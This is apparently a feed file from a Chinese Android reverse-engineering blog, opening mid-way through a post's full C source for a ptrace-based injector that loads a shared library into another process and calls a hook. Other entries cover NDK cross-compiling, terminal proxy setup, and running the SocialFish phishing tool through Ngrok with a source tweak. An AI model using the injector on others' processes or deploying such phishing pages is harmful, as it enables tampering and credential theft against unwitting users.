class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_continue</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_CONT, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ptrace_cont"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">union</span> u &#123;</span><br><span class="line">            <span class="keyword">long</span> val;</span><br><span class="line">            <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child,</span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child,</span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *pch;</span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fp = fopen(filename, <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, module_name)) &#123;</span><br><span class="line">                pch = strtok( line, <span class="string">"-"</span> );</span><br><span class="line">                addr = strtoul( pch, <span class="literal">NULL</span>, <span class="number">16</span> );</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (addr == <span class="number">0x8000</span>)</span><br><span class="line">                    addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fclose(fp) ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_remote_addr</span><span class="params">(<span class="keyword">pid_t</span> target_pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name, <span class="keyword">void</span>* local_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* local_handle, *remote_handle;</span><br><span class="line"></span><br><span class="line">    local_handle = get_module_base(<span class="number">0</span>, module_name);</span><br><span class="line">    remote_handle = get_module_base(target_pid, module_name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> ret_addr = (<span class="keyword">long</span>)((<span class="keyword">uint32_t</span>)local_addr + (<span class="keyword">uint32_t</span>)remote_handle - (<span class="keyword">uint32_t</span>)local_handle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_call</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint32_t</span> addr, <span class="keyword">long</span> *params, <span class="keyword">uint32_t</span> num_params, struct pt_regs* regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_params &amp;&amp; i &lt; <span class="number">4</span>; i ++) &#123;</span><br><span class="line">        regs-&gt;uregs[i] = params[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// push remained params onto stack</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (i &lt; num_params) &#123;</span><br><span class="line">        regs-&gt;ARM_sp -= (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>) ;</span><br><span class="line">        putdata(pid, regs-&gt;ARM_sp, (<span class="keyword">char</span>*)&amp;params[i], (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    regs-&gt;ARM_pc = addr;</span><br><span class="line">    <span class="keyword">if</span> (regs-&gt;ARM_pc &amp; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* thumb */</span></span><br><span class="line">        regs-&gt;ARM_pc &amp;= (~<span class="number">1u</span>);</span><br><span class="line">        regs-&gt;ARM_cpsr |= CPSR_T_MASK;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* arm */</span></span><br><span class="line">        regs-&gt;ARM_cpsr &amp;= ~CPSR_T_MASK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    regs-&gt;ARM_lr = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ptrace_setregs(pid, regs) == <span class="number">-1</span></span><br><span class="line">            || ptrace_continue(pid) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;</span><br><span class="line">    waitpid(pid, &amp;stat, WUNTRACED);</span><br><span class="line">    <span class="keyword">while</span> (stat != <span class="number">0xb7f</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ptrace_continue(pid) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        waitpid(pid, &amp;stat, WUNTRACED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">injectSo</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">char</span>* so_path, <span class="keyword">char</span>* function_name,<span class="keyword">char</span>* parameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">old_regs</span>,<span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">long</span> mmap_addr, dlopen_addr, dlsym_addr, dlclose_addr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//save old regs</span></span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;old_regs);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;regs, &amp;old_regs, <span class="keyword">sizeof</span>(regs));</span><br><span class="line"></span><br><span class="line"><span class="comment">//get remote addres</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"getting remote addres:\n"</span>);</span><br><span class="line">    mmap_addr = get_remote_addr(pid, libc_path, (<span class="keyword">void</span> *)mmap);</span><br><span class="line">    dlopen_addr = get_remote_addr( pid, libc_path, (<span class="keyword">void</span> *)dlopen );</span><br><span class="line">    dlsym_addr = get_remote_addr( pid, libc_path, (<span class="keyword">void</span> *)dlsym );</span><br><span class="line">    dlclose_addr = get_remote_addr( pid, libc_path, (<span class="keyword">void</span> *)dlclose );</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmap_addr=%p dlopen_addr=%p dlsym_addr=%p dlclose_addr=%p\n"</span>,</span><br><span class="line">    (<span class="keyword">void</span>*)mmap_addr,(<span class="keyword">void</span>*)dlopen_addr,(<span class="keyword">void</span>*)dlsym_addr,(<span class="keyword">void</span>*)dlclose_addr);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">long</span> parameters[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//mmap</span></span><br><span class="line"></span><br><span class="line">    parameters[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//address</span></span><br><span class="line">    parameters[<span class="number">1</span>] = <span class="number">0x4000</span>; <span class="comment">//size</span></span><br><span class="line">    parameters[<span class="number">2</span>] = PROT_READ | PROT_WRITE | PROT_EXEC; <span class="comment">//WRX</span></span><br><span class="line">    parameters[<span class="number">3</span>] = MAP_ANONYMOUS | MAP_PRIVATE; <span class="comment">//flag</span></span><br><span class="line">    parameters[<span class="number">4</span>] = <span class="number">0</span>; <span class="comment">//fd</span></span><br><span class="line">    parameters[<span class="number">5</span>] = <span class="number">0</span>; <span class="comment">//offset</span></span><br><span class="line">    </span><br><span class="line">    ptrace_call(pid, mmap_addr, parameters, <span class="number">6</span>, &amp;regs);</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> map_base = regs.ARM_r0;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"map_base = %p\n"</span>, (<span class="keyword">void</span>*)map_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">//dlopen</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"save so_path = %s to map_base = %p\n"</span>, so_path, (<span class="keyword">void</span>*)map_base);</span><br><span class="line">    putdata(pid, map_base, so_path, <span class="built_in">strlen</span>(so_path) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    parameters[<span class="number">0</span>] = map_base;</span><br><span class="line">    parameters[<span class="number">1</span>] = RTLD_NOW| RTLD_GLOBAL;</span><br><span class="line"></span><br><span class="line">    ptrace_call(pid, dlopen_addr, parameters, <span class="number">2</span>, &amp;regs);</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">long</span> handle = regs.ARM_r0;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"handle = %p\n"</span>,(<span class="keyword">void</span>*) handle);</span><br><span class="line"></span><br><span class="line"><span class="comment">//dlsym</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"save function_name = %s to map_base = %p\n"</span>, function_name, (<span class="keyword">void</span>*)map_base);</span><br><span class="line">    putdata(pid, map_base, function_name, <span class="built_in">strlen</span>(function_name) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    parameters[<span class="number">0</span>] = handle;</span><br><span class="line">    parameters[<span class="number">1</span>] = map_base;</span><br><span class="line"></span><br><span class="line">    ptrace_call(pid, dlsym_addr, parameters, <span class="number">2</span>, &amp;regs);</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">long</span> function_ptr = regs.ARM_r0;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"function_ptr = %p\n"</span>, (<span class="keyword">void</span>*)function_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//function_call</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"save parameter = %s to map_base = %p\n"</span>, parameter, (<span class="keyword">void</span>*)map_base);</span><br><span class="line">    putdata(pid, map_base, parameter, <span class="built_in">strlen</span>(parameter) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    parameters[<span class="number">0</span>] = map_base;</span><br><span class="line"></span><br><span class="line">    ptrace_call(pid, function_ptr, parameters, <span class="number">1</span>, &amp;regs);</span><br><span class="line"></span><br><span class="line"><span class="comment">//dlcose</span></span><br><span class="line"></span><br><span class="line">    parameters[<span class="number">0</span>] = handle;</span><br><span class="line"></span><br><span class="line">    ptrace_call(pid, dlclose_addr, parameters, <span class="number">1</span>, &amp;regs);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//restore old regs</span></span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, &amp;old_regs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: %s &lt;pid to be traced&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">                                                                                                     </span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> != ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Trace process failed:%d.\n"</span>, errno);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* so_path = <span class="string">"/data/local/tmp/libinject.so"</span>;</span><br><span class="line">    <span class="keyword">char</span>* function_name = <span class="string">"mzhengHook"</span>;</span><br><span class="line">    <span class="keyword">char</span>* parameter = <span class="string">"sevenWeapons"</span>;</span><br><span class="line">    injectSo(pid, so_path, function_name, parameter);</span><br><span class="line">    </span><br><span class="line">    ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hook </tag>
            
            <tag> android native hook </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>在android手机上运行C程序 - hello arm!</title>
      <link href="/2018/02/02/hello-arm/"/>
      <url>/2018/02/02/hello-arm/</url>
      <content type="html"><![CDATA[<h1 id="gcc交叉编译"><a href="#gcc交叉编译" class="headerlink" title="gcc交叉编译"></a>gcc交叉编译</h1><p>暂时不想研究<a href="https://developer.android.com/ndk/guides/android_mk.html?hl=zh-cn" target="_blank" rel="noopener">Android.mk</a><br>就取巧了一下，用的<a href="https://developer.android.com/ndk/guides/standalone_toolchain.html?hl=zh-cn#itc" target="_blank" rel="noopener">独立工具链</a><br><strong>然而不行</strong></p><h2 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h2><p>打开~/.bashrc文件，填入这些内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#android-ndk-gcc</span><br><span class="line">export NDK=~/Library/Android/sdk/ndk-bundle</span><br><span class="line">export SYSROOT=$NDK/platforms/android-21/arch-arm</span><br><span class="line">export CC=&quot;$NDK/toolchains/arm-linux-androideabi-4.9/prebuilt/ \</span><br><span class="line">linux-x86/bin/arm-linux-androideabi-gcc-4.9 --sysroot=$SYSROOT&quot;</span><br></pre></td></tr></table></figure></p><p><code>source ~/.bashrc</code>启用。<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo2gnd3pjlj30fw02wwf1.jpg" alt=""></p><h2 id="编写程序"><a href="#编写程序" class="headerlink" title="编写程序"></a>编写程序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"hello arm!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>CC -o hello-arm -c hello-arm.c</code><br>理论上这样就可以了，然而我这还是不可以。无法解决的报错。<br> <img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo2hiabc45j30ac012aa0.jpg" alt=""></p><h1 id="使用ndk-build"><a href="#使用ndk-build" class="headerlink" title="使用ndk-build"></a>使用ndk-build</h1><p>因为上面那种方法GG,就只能用这种方法了~</p><h2 id="添加环境变量-1"><a href="#添加环境变量-1" class="headerlink" title="添加环境变量"></a>添加环境变量</h2><p>打开~/.bashrc<br>输入下面这两句<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo2iuyulkrj30ng0b0tb2.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export NDK=~/Library/Android/sdk/ndk-bundle</span><br><span class="line">alias ndk-build=&quot;$NDK/ndk-build&quot;</span><br></pre></td></tr></table></figure></p><p>然后<code>source ~/.bashrc</code>，就可以使用ndk-build了。</p><h2 id="新建android工程和jni目录"><a href="#新建android工程和jni目录" class="headerlink" title="新建android工程和jni目录"></a>新建android工程和jni目录</h2><p>这个肯定不用我说了……就建一个empty project即可<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo2ixb4c11j30rt0ihmzt.jpg" alt=""></p><h2 id="编写c文件和Android-mk"><a href="#编写c文件和Android-mk" class="headerlink" title="编写c文件和Android.mk"></a>编写c文件和Android.mk</h2><p>新建脚本文件名为Android.mk,这是ndk-build需要的工程编译脚本,描述了编译程序的各种选项和依赖.<br>内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_ARM_MODE := arm</span><br><span class="line">LOCAL_MODULE := hello-arm</span><br><span class="line">LOCAL_SRC_FILES := hello-arm.c</span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br></pre></td></tr></table></figure></p><p>其中:<br>LOCAL_PATH表示本工程源码的路径, my-dir表示Android.mk的路径;<br>CLEAR_VARS让编译器清除已经定义过的宏,避免在编译多个模块时发生错误,因为这些宏是全局的,必须重新设置;<br>LOCAL_ARM_MODE指定程序使用的ARM指令模式;<br>LOCAL_MODULE指定生成的模块名,如果生成的是共享库,模块名会变为libhello-arm.so;<br>LOCAL_SRC_FILES指定源文件列表;<br>BUILD_EXECUTABLE表示生成的文件是可执行的,其他选项有BUILD_SHARED_LIBRARY(生成动态库),BUILD_STATIC_LIBRARY(生成静态库).</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>在jni目录下，输入ndk-build，编译完成后的文件在libs/armeabi目录下.<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo2izqzjhuj30fs09ymz6.jpg" alt=""></p><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>执行adb push hello-arm /data/local/tmp到手机上<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo2j0yxnxkj309x03vmxf.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SocialFish钓鱼</title>
      <link href="/2018/02/02/SocialFish/"/>
      <url>/2018/02/02/SocialFish/</url>
      <content type="html"><![CDATA[<p>这是看到玄武的推送，觉得有意思，就写了这篇文章</p><h1 id="下载SocialFish"><a href="#下载SocialFish" class="headerlink" title="下载SocialFish"></a>下载SocialFish</h1><p>SocialFish-与 Ngrok 集成的社工钓鱼工具<br><a href="https://github.com/UndeadSec/SocialFish" target="_blank" rel="noopener">https://github.com/UndeadSec/SocialFish</a><br>必须在Linux系统上使用，所以我使用的是虚拟机。</p><h1 id="配置终端代理"><a href="#配置终端代理" class="headerlink" title="配置终端代理"></a>配置终端代理</h1><p>分析源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connected</span><span class="params">(host=<span class="string">'http://duckduckgo.com'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urlopen(host)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">if</span> connected() == <span class="keyword">False</span>:</span><br><span class="line">     <span class="keyword">print</span> <span class="string">'''</span></span><br><span class="line"><span class="string">  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _ </span></span><br><span class="line"><span class="string">      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|</span></span><br><span class="line"><span class="string">      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |</span></span><br><span class="line"><span class="string">          \|           </span></span><br><span class="line"><span class="string">                    &#123;0&#125;[&#123;1&#125;!&#123;0&#125;]&#123;1&#125; Network error. Verify your connection.\n</span></span><br><span class="line"><span class="string">'''</span>.format(RED, END)</span><br><span class="line">     exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p>很显然要翻墙才能运行，而ss的全局代理并不代理终端，所以我搜了一下资料进行了配置，参考我的<a href="http://eternalsakura13.com/2018/02/02/proxy/">这篇文章</a><br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo2f38rwj4j30ty0ac42m.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo2fcrgvmwj30ha06twfs.jpg" alt=""></p><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo2f55j36qj317q0i278i.jpg" alt=""><br>显然原理就是先构造好钓鱼页面。<br>然后直接运行<code>python SocialFish.py</code>即可，不过遇到一个坑就是终端代理之后，curl不能访问127.0.0.1了。<br>所以改一下源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runNgrok</span><span class="params">()</span>:</span></span><br><span class="line">    system(<span class="string">'./Server/ngrok http 80 &gt; /dev/null &amp;'</span>)</span><br><span class="line">    sleep(<span class="number">10</span>)</span><br><span class="line">    system(<span class="string">'curl --noproxy "*" -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh &gt; ngrok.url'</span>)    </span><br><span class="line">    url = open(<span class="string">'ngrok.url'</span>, <span class="string">'r'</span>)</span><br><span class="line">    print(<span class="string">'\n &#123;0&#125;[&#123;1&#125;*&#123;0&#125;]&#123;1&#125; Ngrok URL: &#123;2&#125;'</span> + url.readlines()[<span class="number">0</span>] + <span class="string">'&#123;1&#125;'</span>).format(CYAN, END, GREEN)</span><br><span class="line">    url.close()</span><br></pre></td></tr></table></figure></p><p><strong>system(‘curl –noproxy “<em>“ -s <a href="http://127.0.0.1:4040/status" target="_blank" rel="noopener">http://127.0.0.1:4040/status</a> | grep -P “https://.</em>?ngrok.io” -oh &gt; ngrok.url’)</strong><br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo2fkih24oj30kq0o3q5a.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo2flh3lbqj31kw0qmdpn.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo2flseinnj30se07wmzc.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>本机和虚拟机终端代理设置</title>
      <link href="/2018/02/02/proxy/"/>
      <url>/2018/02/02/proxy/</url>
      <content type="html"><![CDATA[<h1 id="Mac终端代理"><a href="#Mac终端代理" class="headerlink" title="Mac终端代理"></a>Mac终端代理</h1><p><code>vim ~/.bash_profile</code><br>然后在里面输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias setproxy=&quot;export ALL_PROXY=socks5://127.0.0.1:1086&quot; </span><br><span class="line">alias unsetproxy=&quot;unset ALL_PROXY&quot;</span><br></pre></td></tr></table></figure></p><p>export ALL_PROXY=socks5://127.0.0.1:<strong>1086</strong>,这里的1086根据自己的电脑去修改，设置如下<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo25z0wtk0j30io0m2td6.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo25zd0bvmj30qc0ikwh9.jpg" alt=""></p><p>可以直接把上述代码拷贝到上述对应文件的末尾，修改完成之后执行如下命令使修改生效<br><code>source ~/.bash_profile</code><br>然后只要输入setproxy就可以设置代理，输入unsetproxy就取消代理<br>设置完毕后，输入<code>curl -i http://ip.cn</code>确认修改成功。</p><h1 id="虚拟机走终端代理"><a href="#虚拟机走终端代理" class="headerlink" title="虚拟机走终端代理"></a>虚拟机走终端代理</h1><h2 id="修改ss配置"><a href="#修改ss配置" class="headerlink" title="修改ss配置"></a>修改ss配置</h2><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo262zvsgjj30qo0humza.jpg" alt=""></p><h2 id="设置虚拟机"><a href="#设置虚拟机" class="headerlink" title="设置虚拟机"></a>设置虚拟机</h2><p>先看一下自己电脑的ip是多少<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-27-195715.png" alt=""><br>我这里使用的是共享网络，不知道换其他行不行。<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo263h4zarj30rq0gytc7.jpg" alt=""><br>然后在setting-&gt;network<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-27-195650.png" alt="">修改成功后在终端输入<br><code>export ALL_PROXY=http://192.168.10.201:1087</code><br>然后输入<br><code>curl -i http://ip.cn</code>确认。</p><h2 id="windodws"><a href="#windodws" class="headerlink" title="windodws"></a>windodws</h2><p>算是一个补充<br>勾选上允许来自局域网的链接选项。<br>然后设置虚拟机的网络模式为桥接模式（注意不要勾选复制主机的网络）<br>这样主机和虚拟机在一个局域网里。<br>然后在setting-&gt;network里向上面那么设置，1087改成1080.<br>在终端里export ALL_PROXY=<a 